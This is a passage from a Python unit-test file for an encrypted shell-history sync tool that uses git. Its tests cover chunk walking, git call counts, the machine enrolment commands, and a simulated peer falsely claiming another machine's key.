                    alpha.record(day, 1_700_000_100 + i, f"{day} number {i}")
                    sync.run()
            sync.grant()
        with beta.active():
            sync.run()
        return alpha, beta

    def test_the_names_are_the_ones_the_chunk_walk_yields(self) -> None:
        """The two views of the same tree must not drift.

        `iter_chunks` is built on `iter_chunk_days`, and everything that reads a
        chunk still goes through it -- so a difference here would mean `merge`
        and `compact` disagreeing about what a host published.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            by_day = list(archive.iter_chunk_days(alpha.id))
            flat = [(chunk.day, chunk.name) for chunk in archive.iter_chunks(alpha.id)]

        self.assertEqual(
            [(day, name) for day, names in by_day for name in names],
            flat,
            "the name walk and the chunk walk disagree",
        )
        # Sorted, and each day exactly once. `_Day` *replaces* the log file it
        # writes, so a day arriving in two pieces would have the second
        # overwrite what the first had just written.
        self.assertEqual([day for day, _ in by_day], sorted(self.DAYS))
        for _day, names in by_day:
            self.assertEqual(names, sorted(names))
            self.assertTrue(names, "an empty day was yielded")

    def test_only_chunks_are_yielded(self) -> None:
        """A day directory is not guaranteed to hold nothing else.

        A partial write, an editor's backup, a `.orig` left by a merge tool: the
        walk names what it is looking for rather than taking whatever is there,
        because everything downstream treats a name as a chunk to authenticate.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            directory = archive.chunk_dir(alpha.id, "2023-11-14")
            (directory / "1700000000-abcdef.age.tmp").write_bytes(b"half a chunk")
            (directory / "notes.txt").write_text("not a chunk", encoding="utf-8")

            names = dict(archive.iter_chunk_days(alpha.id))["2023-11-14"]
        self.assertTrue(all(name.endswith(".age") for name in names), names)
        self.assertEqual(len(names), 2)

    def test_a_directory_holding_no_chunk_is_not_a_day(self) -> None:
        """Empty and "nothing new" are different answers, told apart here.

        A day directory can exist with nothing in it -- a `compact` that removed
        the last chunk, a partial write cleaned up -- and every caller would
        otherwise have to ask. `has_chunks` in particular decides whether an
        orphaned day key is a loss or a harmless nuisance, so a directory with
        only a stray file in it must read as empty there too.
        """
        alpha, _beta = self.stocked()
        with alpha.active():
            hollow = archive.chunk_dir(alpha.id, "2023-11-20")
            hollow.mkdir(parents=True, exist_ok=True)

            self.assertNotIn("2023-11-20", dict(archive.iter_chunk_days(alpha.id)))
            self.assertFalse(sync.has_chunks(alpha.id, "2023-11-20"))

            (hollow / "1700000000-abcdef.age.tmp").write_bytes(b"half a chunk")
            self.assertNotIn("2023-11-20", dict(archive.iter_chunk_days(alpha.id)))
            self.assertFalse(
                sync.has_chunks(alpha.id, "2023-11-20"), "a stray file counted as a chunk"
            )

            # And a day that does hold one still says so.
            self.assertTrue(sync.has_chunks(alpha.id, "2023-11-14"))

    def test_one_day_is_not_answered_by_walking_the_host(self) -> None:
        """`orphaned_days` asks once per orphaned day, so the cost compounds.

        Answering from a whole-host walk made a 0.12 ms question 5 ms, and
        `orphaned_days` 5 ms to 184 ms with 40 orphaned days over 20k chunks --
        quadratic in the archive, in exactly the state `doctor` exists to find
        and that a stranger with push access can create.
        """
        alpha, _beta = self.stocked()
        walked: list[str] = []
        real = archive.iter_chunk_days

        def spy(machine_id: str) -> Iterator[tuple[str, list[str]]]:
            walked.append(machine_id)
            return real(machine_id)

        with alpha.active(), mock.patch.object(archive, "iter_chunk_days", spy):
            self.assertTrue(sync.has_chunks(alpha.id, "2023-11-14"))
            sync.orphaned_days()

            # `export` asks the same question, per day it is sealing, on every
            # sync that records anything.
            alpha.record("2023-11-14", 1_700_000_900, "one more")
            self.assertTrue(
                sync.export(store.machine(), sync.State.load(), sync.Report(), 1_700_000_901)
            )
        self.assertEqual(walked, [], "a one-day question walked the whole host")

    def test_keys_and_manifests_are_not_mistaken_for_days(self) -> None:
        """They sit in the same host directory, and neither holds chunks."""
        alpha, _beta = self.stocked()
        with alpha.active():
            siblings = {p.name for p in archive.repo_host_dir(alpha.id).iterdir() if p.is_dir()}
            self.assertTrue({"keys", "manifests"} <= siblings, siblings)
            self.assertEqual({day for day, _ in archive.iter_chunk_days(alpha.id)}, set(self.DAYS))

    def test_an_idle_merge_builds_nothing_per_chunk(self) -> None:
        """The saving itself, asserted where a future change would undo it.

        Nothing is new, so `merge` has no reason to construct a `Chunk` -- and
        constructing one per file is what made this walk cost 8x what reading
        the names does.
        """
        _alpha, beta = self.stocked()
        real = archive.iter_chunks
        used = []

        def spy(machine_id: str) -> Iterator[archive.Chunk]:
            used.append(machine_id)
            return real(machine_id)

        with beta.active(), mock.patch.object(archive, "iter_chunks", spy):
            report = sync.run()
        self.assertEqual(report.chunks_merged, 0)
        self.assertEqual(used, [], "merge built Chunk objects for an idle sync")


class TestExportDoesNotReadWhatCannotHaveChanged(SyncTestCase):
    """Issue #80: the early exit is the shape of every idle sync.

    Getting to it used to cost work proportional to the whole history -- every
    host's log directory listed, and every one of this machine's own day files
    opened, seeked, read and closed to discover it had not grown.
    """

    def read_tails(self, machine: Fake) -> list[str]:
        """Which log files one `export` actually opens."""
        opened: list[str] = []
        real = store.read_tail

        def counted(path: Path, offset: int) -> tuple[bytes, int]:
            opened.append(path.name)
            return real(path, offset)

        with machine.active(), mock.patch.object(store, "read_tail", counted):
            self.export_once()
        return opened

    def export_once(self) -> None:
        """One `export` as `run` would call it. Caller holds `active()`."""
        sync.export(store.machine(), sync.State.load(), sync.Report(), 1_700_000_900)

    def test_a_log_that_cannot_have_grown_is_not_opened(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for day in ("2023-11-14", "2023-11-15", "2023-11-16"):
                alpha.record(day, 1_700_000_001, f"on {day}")
                sync.run()

        self.assertEqual(self.read_tails(alpha), [], "an unchanged log was read")

        with alpha.active():
            alpha.record("2023-11-15", 1_700_000_002, "a later line")
        # Only the day that grew, not the three that exist.
        self.assertEqual(self.read_tails(alpha), ["2023-11-15.tsv"])

    def test_a_log_that_shrank_is_not_read_either(self) -> None:
        """A truncated log reads as nothing new, exactly as it did before.

        `read_tail` seeking past the end returns no data, so skipping the open
        gives the same answer -- which is what makes the comparison `<=` and not
        `==`. Pinned because it is the one case where the two differ in reads
        but must not differ in outcome.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            store.log_file(alpha.id, "2023-11-14").write_text("", encoding="utf-8")

        self.assertEqual(self.read_tails(alpha), [])
        with alpha.active():
            self.assertEqual(sync.run().lines_exported, 0)

    def test_only_our_own_host_directory_is_listed(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
        # alpha cloned before beta existed, so it has to be told beta is real.
        self.accept_everyone(alpha)
        with alpha.active():
            sync.run()  # alpha now holds a decrypted copy of beta's log

            everyone = {log.host_id for log in store.iter_log_files()}
            self.assertEqual(everyone, {alpha.id, beta.id})

            listed: list[str] = []
            real = store.iter_log_files

            def counted(host_id: str | None = None) -> Iterator[store.LogFile]:
                for log in real(host_id):
                    listed.append(log.host_id)
                    yield log

            with mock.patch.object(store, "iter_log_files", counted):
                self.export_once()
            self.assertEqual(set(listed), {alpha.id}, "another host's logs were listed")

            # And narrowing cannot change *what* is exported: the same files the
            # caller would have kept after filtering, in the same order.
            self.assertEqual(
                [log.relpath for log in store.iter_log_files(alpha.id)],
                [log.relpath for log in store.iter_log_files() if log.host_id == alpha.id],
            )


class TestSyncDoesNotForkGitMoreThanItNeedsTo(SyncTestCase):
    """`sync` runs from a one-minute timer, so each fork is a recurring cost.

    The numbers are a ceiling, not a description: they exist so that adding a
    git call to this path is a decision somebody makes rather than one that
    happens. Raise them deliberately when a call earns its place.
    """

    def git_calls(self) -> list[str]:
        """Every git subcommand one `sync.run()` spawns, in order.

        Counted at `gitrepo.git`, which is the only place in the package that
        spawns git -- the same seam the chunk-read counters in this file use,
        and it needs no argv sniffing to tell git from `age`. That claim used to
        be prose here; `tests/test_architecture.py::TestOneModuleSpawnsGit` now
        holds it, because a fork from anywhere else would be invisible to this
        and so would be free.
        """
        real = gitrepo.git
        seen: list[str] = []

        def spy(*args: str, **kwargs: object) -> str:
            seen.append(" ".join(args[:2]))
            return real(*args, **kwargs)  # type: ignore[arg-type]

        with mock.patch.object(gitrepo, "git", spy):
            sync.run()
        return seen

    def test_an_idle_sync_forks_git_four_times(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            calls = self.git_calls()
        self.assertLessEqual(len(calls), 4, calls)
        # The identity and the remote come from one config read, not three.
        self.assertEqual([c for c in calls if c.startswith("config")], ["config --list"])
        self.assertEqual([c for c in calls if c.startswith("remote")], [])
        # Level with the remote, so neither replaying nor sending is any work.
        self.assertEqual([c for c in calls if c.startswith(("rebase", "push"))], [])
        # The branch cannot change mid-run, so it is asked for once.
        self.assertEqual([c for c in calls if c.startswith("branch")], ["branch --show-current"])
        # Nothing wrote, so there is nothing to stage -- and `add -A` is a full
        # stat of every chunk this machine ever published. Measured at 20k
        # chunks: an idle sync drops from 20.6 ms to 10.3 ms by not asking.
        self.assertEqual([c for c in calls if c.startswith("add")], [])

    def test_a_sync_that_wrote_something_still_commits_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            calls = self.git_calls()
            self.assertIn("add -A", calls)
            self.assertIn("commit -q", calls)
            self.assertIn("push --quiet", calls)

    def test_a_republished_signer_is_committed_even_with_nothing_to_export(self) -> None:
        """The other writer on this path, and the one with no chunk beside it.

        `publish_signer` writes about once in a machine's life -- but when it
        does, it may well be the *only* thing that run wrote. Dropping its answer
        leaves this machine's verify key uncommitted, and a peer that cannot read
        it refuses every chunk this host has ever signed.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # A *changed* key, not a deleted file: rewriting the same bytes
            # leaves the worktree matching HEAD, so there would be nothing to
            # commit and the assertion below would hold either way.
            key = store.signing_key_file()
            key.unlink()
            crypto.public_half(key).unlink()
            fresh = crypto.generate_signing_key(key)

            published = archive.signer_public(alpha.id)
            sync.run()  # nothing new to export: the signer is all there is

            self.assertIn(fresh, published.read_text(encoding="utf-8"))
            self.assertEqual(
                gitrepo.git("status", "--porcelain", "--", str(published)),
                "",
                "the republished signer was left uncommitted",
            )

        # And it reached the remote, which is the point of publishing it.
        beta = self.machine("beta")
        with beta.active():
            self.assertIn(fresh, archive.signer_public(alpha.id).read_text(encoding="utf-8"))

    def test_a_day_that_can_never_be_exported_does_not_cost_a_stat_every_run(self) -> None:
        """The state where answering "probably wrote" would undo the whole fix.

        A day refused for a missing key never advances `state.exported`, so its
        tail is fresh again on every run for the life of the machine. An `export`
        that reported "wrote something" merely for having looked would then stat
        the entire working tree once a minute, forever, in exactly the stuck
        state this is meant to relieve.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # The sealed half gone: `export` refuses the day rather than
            # re-minting a key peers could never open. See `orphaned_day_key`.
            archive.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")

            first = self.git_calls()
            self.assertIn("2023-11-14", sync.run().subjects(sync.ORPHANED))
            for _ in range(3):
                calls = self.git_calls()
                self.assertEqual(
                    [c for c in calls if c.startswith("add")], [], f"first run was {first}"
                )

    def test_files_left_by_a_run_that_died_are_committed_by_the_next_one(self) -> None:
        """The catch-up that makes skipping the `add` safe.

        A run that died between writing a chunk and committing it leaves that
        chunk unstaged. It is not stranded: the watermark was not saved either,
        so the next run with anything to export writes again -- and that run's
        `add -A` stages the leftovers alongside the new files.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

            # What a run that died after `write_atomic` and before `commit`
            # leaves behind.
            # Into the day directory the sync above already made, because that
            # is where a run that died after `write_atomic` would have left it.
            stray = archive.chunk_dir(alpha.id, "2023-11-14") / "1700000009-abcdef.age"
            stray.write_bytes(b"debris from a run that did not finish")

            # An idle sync leaves it alone, which is the whole point.
            sync.run()
            self.assertNotIn(stray.name, gitrepo.git("show", "--name-only", "--format=", "HEAD"))

            # The next run with something of its own to write picks it up.
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
            # HEAD, not the last few commits: the catch-up has to happen on
            # the run that wrote, not eventually.
            self.assertIn(stray.name, gitrepo.git("show", "--name-only", "--format=", "HEAD"))

    def test_a_sync_with_something_to_say_still_pushes(self) -> None:
        """The half that would silently stop publishing if the skip overreached.

        `gitrepo.fetch_and_rebase` decides "level with the remote" *before* this
        chunk is committed, so a skip keyed on that alone strands every machine
        that was up to date a moment ago -- which is every machine, every time.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.run()  # idle: leaves alpha level with the remote
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            calls = self.git_calls()
        self.assertIn("push --quiet", calls)

        beta = self.machine("beta")
        with beta.active():
            sync.run()
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status", "make -j8"})

    def test_a_sync_that_only_receives_does_not_push(self) -> None:
        """Adopting a peer's commit leaves nothing of our own to send.

        `push` opens a connection to the remote whether or not it has anything
        to say, and this fires on every machine every time any peer records a
        command -- so it is the most frequent needless round trip there is.
        """
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            calls = self.git_calls()
            self.assertIn("rebase --autostash", calls)
            self.assertNotIn("push --quiet", calls)
            self.assertEqual(beta.commands(), {"git status"})

    def test_a_machine_ahead_of_the_remote_still_pushes(self) -> None:
        """The trap in deciding "level" from anything but where HEAD lands.

        A commit the remote has not seen makes `origin/<branch>` an *ancestor*
        of HEAD. Every cheap test for "up to date" -- `merge --ff-only`, "the
        rebase replayed nothing", "the fetch changed no ref" -- passes in that
        state, and a machine that believes it would stop publishing silently and
        for good, because the condition never clears by itself.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            # A commit that never reached the remote -- what a compaction, or a
            # run that died between committing and pushing, leaves behind.
            archive.recipients_file().write_text(
                archive.recipients_file().read_text(encoding="utf-8") + "\n", "utf-8"
            )
            gitrepo.git("commit", "-qam", "unpushed")
            calls = self.git_calls()
            self.assertIn("push --quiet", calls)
            # The branch is read rather than assumed: the harness's bare remote
            # is created with no `-b`, so it is whatever `init.defaultBranch`
            # says on the machine running the suite.
            branch = gitrepo.read_repo().branch
            head, upstream = gitrepo.resolve("HEAD", f"refs/remotes/origin/{branch}")
            self.assertEqual(head, upstream)

    def test_a_sync_behind_the_remote_still_rebases(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()  # picks up alpha's chunk, so it cannot be level first
            beta.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_003, "cargo build")
            calls = self.git_calls()
            self.assertTrue(any(c.startswith("rebase") for c in calls), calls)
            # Asserted at the git level rather than through `commands()`: alpha
            # cloned before beta existed and has not been told beta is real, so
            # it holds the chunk without yet being willing to read it.
            self.assertTrue(list(archive.chunk_dir(beta.id, "2023-11-14").glob("*.age")))
        # And once it is told, the history the rebase brought in is readable.
        self.accept_everyone(alpha)
        with alpha.active():
            sync.run()
            self.assertIn("make -j8", alpha.commands())


class TestResolvingSeveralRefsInOneFork(SyncTestCase):
    def test_a_ref_that_does_not_exist_comes_back_empty(self) -> None:
        """`rev-parse` echoes an argument it cannot resolve instead of dropping it.

        Taking that echo for an object id would make an unborn branch look like
        it matched the remote, and skip both the rebase and the push for good.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            head, missing = gitrepo.resolve("HEAD", "refs/remotes/origin/no-such-branch")
            self.assertEqual(len(head), 40)
            self.assertEqual(missing, "")

    def test_an_unborn_head_resolves_to_nothing(self) -> None:
        """The state `init` is in while enrolling the very first machine."""
        alpha = self.machine("alpha")
        with alpha.active():
            branch = gitrepo.read_repo().branch
            gitrepo.git("update-ref", "-d", "HEAD")
            self.assertEqual(gitrepo.resolve("HEAD", f"refs/remotes/origin/{branch}"), ["", ""])


class TestTheCommitIdentityIsStillPinned(SyncTestCase):
    def test_a_repo_missing_the_identity_gets_it_back(self) -> None:
        """Reading the config in one fork must not stop it being *written*.

        Without an identity, `commit` fails on a machine with no gitconfig --
        which is the machine woswoar is most likely to be installed on.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            gitrepo.git("config", "--unset", "user.name", check=False)
            gitrepo.git("config", "--unset", "user.email", check=False)
            self.assertEqual(gitrepo.read_repo().name, "")

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            self.assertEqual(gitrepo.read_repo().name, gitrepo.COMMIT_NAME)
            self.assertEqual(gitrepo.read_repo().email, gitrepo.COMMIT_EMAIL)
            self.assertIn(gitrepo.COMMIT_NAME, gitrepo.git("log", "-1", "--format=%an"))

    def test_a_repo_with_no_remote_is_seen_to_have_none(self) -> None:
        """The remote is now inferred from config keys rather than `git remote`.

        Getting that wrong in the optimistic direction would make a local-only
        repo try to push on every timer tick, and fail every time.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            self.assertTrue(gitrepo.read_repo().has_remote)
            gitrepo.git("remote", "remove", "origin")
            self.assertFalse(gitrepo.read_repo().has_remote)

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertFalse(report.pushed)


class TestAcceptIsGrantAndTrustAtOnce(SyncTestCase):
    """One command for "that machine is mine", which is the whole of setup.

    `grant` and `trust` answer genuinely different questions and stay separate
    commands. What they were not is something a person adding their second
    laptop should have to hold in their head, and both being needed -- one of
    them on *every* machine you already own -- is what made the setup feel like
    too much.
    """

    def two_machines(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "history from before beta existed")
            sync.run()

        beta = self.machine("beta", display="martin@laptop")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_001, "history beta published itself")
            sync.run()
        return alpha, beta

    def test_one_command_does_what_grant_and_trust_did(self) -> None:
        alpha, beta = self.two_machines()

        code, out, _ = self.run_cli(alpha, "accept", "--yes")
        self.assertEqual(code, 0, out)

        # Both halves, checked by what each machine can actually see afterwards
        # rather than by what the command printed.
        with alpha.active():
            sync.run()
            self.assertIn("history beta published itself", alpha.commands())
        with beta.active():
            sync.run()
            self.assertIn("history from before beta existed", beta.commands())

    def test_it_names_both_keys_and_both_things_it_does(self) -> None:
        """The prompt may get shorter; it may not get vaguer.

        Two keys really are involved and they are checked with different
        commands, so both fingerprints and both check lines have to be on
        screen -- one of them being unfamiliar is what a machine that is not
        yours looks like.
        """
        alpha, beta = self.two_machines()
        with beta.active():
            reads = crypto.recipient_for(sync.identity_path(store.machine())).strip()
            signs = crypto.fingerprint(sync.signing_public())

        out = self.run_cli(alpha, "accept", "--yes").out
        self.assertIn(reads, out)
        self.assertIn(signs, out)
        self.assertIn("ENTIRE history", out)
        self.assertIn(crypto.how_to_check_signer(), out)
        self.assertIn(crypto.how_to_check(reads), out)

    def test_there_is_nothing_to_do_the_second_time(self) -> None:
        alpha, _ = self.two_machines()
        self.run_cli(alpha, "accept", "--yes")
        code, out, _ = self.run_cli(alpha, "accept", "--yes")
        self.assertEqual(code, 0)
        self.assertIn("already granted and trusted", out)

    def test_a_machine_enrolling_during_the_prompt_is_refused(self) -> None:
        """`grant(approved=...)` means "what a human agreed to", and refuses if
        its own fetch disagrees. Rebuilding that list *after* the prompt made
        the refusal unable to fire for the window it exists to cover: the new
        machine is picked up by both reads, they agree, and it is sealed into
        the entire history without ever having been displayed.

        Found by a review of this command, not by the suite -- the existing test
        of the refusal drives `sync.grant` directly, so `accept` walked past it.
        """
        alpha, _ = self.two_machines()

        def enrol_then_agree(question: str, yes: bool = False) -> bool:
            # Somebody runs `woswoar init` on a third machine while the prompt
            # is on screen. Written straight into the repo, which is what that
            # looks like from here.
            alpha.append_recipient("martin@somewhere-else")
            return True

        with mock.patch("woswoar.__main__._confirm", enrol_then_agree):
            code, out, err = self.run_cli(alpha, "accept")

        self.assertEqual(code, 1, out)
        self.assertIn("changed while you were deciding", err + out)

    def test_a_machine_new_to_read_and_changed_to_sign_is_not_called_accepted(self) -> None:
        """The two lists have to be a partition.

        `changed_key` excludes `needs_trust` but not `needs_grant`, and a
        machine that has just joined has granted nobody while TOFU has pinned
        everybody -- so any peer that re-keys is both. Listed among the
        newcomers, its *unpinned* new fingerprint was printed under the words
        "already accepted here", on the same screen that said its key had
        changed.
        """
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "old history")
            sync.run()

        gamma = self.machine("gamma", display="martin@server")  # pins alpha, grants nobody
        with gamma.active():
            sync.run()

        with alpha.active():
            store.signing_key_file().unlink()
            alpha.record("2023-11-17", 1_700_300_001, "after alpha re-keyed")
            sync.run()

        with gamma.active():
            (machine,) = sync.newcomers().machines
            self.assertTrue(machine.needs_grant, "precondition: also new to read")
            self.assertTrue(machine.changed_key, "precondition: and changed to sign")

        code, out, err = self.run_cli(gamma, "accept", "--yes")
        self.assertEqual(code, 1, out)
        self.assertNotIn("already accepted here", out)
        self.assertIn("trust --replace", err + out)

    def test_two_machines_with_one_name_are_flagged(self) -> None:
        """`grant` has said this since it existed, and `accept` widens read
        access on the same evidence -- so it cannot be the quieter of the two.
        Two machines really can share a name, and so can a key someone added."""
        alpha, _ = self.two_machines()
        with alpha.active():
            alpha.append_recipient("martin@laptop")  # the name beta already uses

        out = self.run_cli(alpha, "accept", "--yes").out
        self.assertIn("SAME NAME AS ANOTHER KEY", out)

    def test_it_says_when_this_machine_could_not_open_the_keys(self) -> None:
        """Run on the machine that just joined -- which is where the remedies
        now send people -- `accept` said "re-sealed 0 key file(s), so they can
        read the older history". Both halves of that are false."""
        _, beta = self.two_machines()
        _, out, err = self.run_cli(beta, "accept", "--yes")
        self.assertNotIn("so they can read the older history", out)
        self.assertIn("could not be opened by this machine", err)

    def test_a_changed_signing_key_is_not_swept_along(self) -> None:
        """The one thing `accept` must not make easy.

        A key that changed is either a machine you re-enrolled or someone
        rewriting the repository, and nothing can tell those apart. Rolling it
        into the newcomer prompt is exactly how the second gets agreed to by
        someone answering the first.
        """
        alpha, beta = self.two_machines()
        self.run_cli(alpha, "accept", "--yes")

        # beta re-enrols with a new signing key and publishes under it.
        with beta.active():
            store.signing_key_file().unlink()
            beta.record("2023-11-16", 1_700_200_001, "after the key changed")
            sync.run()

        code, out, err = self.run_cli(alpha, "accept", "--yes")
        self.assertEqual(code, 1, out)
        self.assertIn("trust --replace", err)
        # And it did not quietly pin the new key on the way past.
        with alpha.active():
            changed = [c for c in sync.trust_candidates() if c.changed]
        self.assertEqual(len(changed), 1)


class TestInitFinishesTheJob(SyncTestCase):
    """`init` used to end by telling you to run `sync`."""

    def joining_machine(self) -> Fake:
        """A machine with history of its own, not yet enrolled.

        Not through the harness's `machine()`, which calls `sync.initialise`
        directly -- this is the real `woswoar init` and nothing else. Recording
        before enrolment is the ordinary case: the shell hook starts logging the
        moment `woswoar install` runs, which is before anyone types a git URL.
        """
        beta = Fake(self.root, "beta")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_001, "typed before beta enrolled")
        return beta

    def test_it_syncs_rather_than_telling_you_to(self) -> None:
        """Reading old history still waits for `accept` -- that is the design.
        What no longer waits is this machine publishing its own."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()

        beta = self.joining_machine()
        code, out, _ = self.run_cli(beta, "init", str(self.origin), "--new-identity")
        self.assertEqual(code, 0, out)
        self.assertIn("published 1 line(s)", out)

        # On the remote, not merely on disk here: "it synced" means the other
        # machines can see it.
        with alpha.active():
            sync.run()
            self.assertIn(beta.id, archive.repo_hosts())
            self.assertTrue(archive.chunk_names(beta.id, "2023-11-15"))

    def test_no_sync_still_joins_without_exchanging_anything(self) -> None:
        beta = self.joining_machine()
        out = self.run_cli(beta, "init", str(self.origin), "--new-identity", "--no-sync").out
        self.assertIn("Next: 'woswoar sync'", out)
        with beta.active():
            self.assertEqual(list(archive.chunk_days(beta.id)), [])

    def test_a_failed_first_sync_does_not_fail_the_join(self) -> None:
        """The join is done and durable by the time the sync runs -- identity
        saved, repo cloned, peers pinned. A remote that blinked must not report
        all of that as failure, because the obvious response to a failed `init`
        is to run it again."""
        beta = self.joining_machine()

        def unreachable(*args: object, **kwargs: object) -> None:
            raise errors.SyncError("could not read from remote repository")

        with mock.patch.object(sync, "run", unreachable):
            code, out, err = self.run_cli(beta, "init", str(self.origin), "--new-identity")

        self.assertEqual(code, 0, err)
        self.assertIn("joined, but the first sync failed", err)
        self.assertIn("woswoar sync", out + err)
        with beta.active():
            self.assertTrue(gitrepo.is_repo(), "the join itself was still completed")

    def test_it_points_at_accept_when_there_is_another_machine(self) -> None:
        """The step that is easy to miss, because it happens somewhere else."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()

        beta = Fake(self.root, "beta")
        out = self.run_cli(beta, "init", str(self.origin), "--new-identity").out
        self.assertIn("woswoar accept", out)

    def test_the_first_machine_is_not_told_to_accept_anything(self) -> None:
        """There is nobody to run it on, and a step that cannot be done is
        worse than no step: it reads as something having gone wrong."""
        alpha = Fake(self.root, "alpha")
        out = self.run_cli(alpha, "init", str(self.origin), "--new-identity").out
        self.assertNotIn("woswoar accept", out)
        self.assertIn("first machine", out)


class TestAHostCannotClaimAnotherMachinesKey(SyncTestCase):
    """Issue #110: the pairing is a claim, and it used to be resolved silently.

    `accept` shows a machine's age recipient and its signing key one above the
    other. That they belong to one machine comes from the `owner` line in
    `hosts/<id>/signer.pub` -- a file anyone with push access can write. The
    mapping was built with `setdefault` over `archive.repo_hosts()`, which is
    sorted, and host ids are locally chosen hex: so a directory whose id sorts
    first could name *your* recipient and win it.

    The result was the attacker's verify key printed directly beneath your own
    real, checkable age fingerprint -- which reads as the one confirming the
    other, in the command that widens read access to everything.
    """

    def hostile_claim_on(self, victim_key: str) -> str:
        """A host directory that says it owns `victim_key`. Returns its host id.

        Written straight into the repo, like `append_recipient`: this is what
        arrives by `git pull` from someone who can push.

        The id is forced to sort *first*, because that is what made the old
        `setdefault` prefer it -- an id chosen at random would win only half the
        time and turn this into a coin flip.
        """
        host = "0" * 16
        verify_key = crypto.generate_signing_key(self.root / f"signer-{host}")
        store.write_atomic(archive.signer_public(host), f"{verify_key}\n{victim_key}\n".encode())
        store.write_atomic(store.name_file(host), b"martin@laptop\n")
        return host

    def setUp(self) -> None:
        super().setUp()
        self.alpha = self.machine("alpha", display="martin@desktop")
        with self.alpha.active():
            self.alpha.record("2023-11-14", 1_700_000_001, "history")
            sync.run()
        self.beta = self.machine("beta", display="martin@laptop")
        with self.beta.active():
            self.beta.record("2023-11-15", 1_700_100_001, "beta history")
            sync.run()
            self.beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
            self.beta_signer = sync.signing_public()

    def test_the_stolen_key_is_not_paired_with_the_thief(self) -> None:
        with self.alpha.active():
            paired_before = {
                n.reader.key: n.candidate.verify_key
                for n in sync.newcomers().machines
                if n.reader is not None and n.candidate is not None
            }
            self.assertEqual(
                paired_before.get(self.beta_key),
                self.beta_signer,
                "precondition: beta's own two keys are paired before the attack",
            )

            host = self.hostile_claim_on(self.beta_key)
            self.assertLess(host, self.beta.id, "precondition: the hostile id sorts first")

            after = sync.newcomers()
            paired = {
                n.reader.key: n.candidate.verify_key
                for n in after.machines
                if n.reader is not None and n.candidate is not None
            }
        # Not paired with anyone -- neither the thief nor beta. Nothing in the
        # repository can say which claim is real, so it makes neither.
        self.assertNotIn(self.beta_key, paired)
        self.assertIn(self.beta_key, after.contested)

    def test_the_thief_cannot_put_a_name_on_the_stolen_key_either(self) -> None:
        with self.alpha.active():
            self.hostile_claim_on(self.beta_key)
            labels = {r.key: r.label for r in sync.readers()}
        self.assertEqual(labels[self.beta_key], sync.UNNAMED)

    def test_accept_says_the_repository_is_claiming_it(self) -> None:
        with self.alpha.active():
            self.hostile_claim_on(self.beta_key)
        _, _, err = self.run_cli(self.alpha, "accept", "--yes")
        self.assertIn("claimed by more than one machine", err)

    def test_an_honest_repository_still_pairs_and_says_it_is_a_claim(self) -> None:
        """The other half: without an attacker nothing is contested, the two
        keys are still shown together, and the line saying where that pairing
        comes from is still there."""
        with self.alpha.active():
            self.assertEqual(sync.newcomers().contested, set())
        _, out, _ = self.run_cli(self.alpha, "accept", "--yes")
        self.assertIn("the repository's claim", out)
        self.assertNotIn("claimed by more than one machine", out)


class TestTheStatusLine(SyncTestCase):
    """`woswoar` on its own: the one command somebody has to know.

    It routes; it does not act. Everything it can point at is still a command of
    its own, and the ones that widen who can read the history stay that way --
    a consent prompt that appears because you typed the bare command is one
    whose moment somebody else chose.
    """

    def two_machines(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "old history")
            sync.run()
        beta = self.machine("beta", display="martin@laptop")
        with beta.active():
